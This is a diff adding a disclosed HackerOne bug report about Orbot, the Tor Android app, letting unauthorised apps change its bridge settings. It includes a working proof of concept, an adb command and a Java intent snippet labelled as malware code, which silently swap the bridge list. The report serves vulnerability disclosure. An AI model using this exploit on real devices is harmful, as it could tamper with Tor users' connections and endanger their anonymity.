@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/252626
+WeaknessName:Forced Browsing
+Reporter:https://hackerone.com/bagipro
+ReportedTo:Tor(torproject)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:21.08.2017 19:11:41
+
+Summary:
+
+Do the following thing from ADB to emulate the activity start:
+```
+adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx
+```
+
+Or create a malware app with the following code:
+```java
+        Intent intent = new Intent("android.intent.action.VIEW");
+        intent.setClassName("org.torproject.android", "org.torproject.android.OrbotMainActivity");
+        intent.setData(Uri.parse("bridge://xxx"));
+        startActivity(intent);
+```
+
+And new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).
+
+It's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).
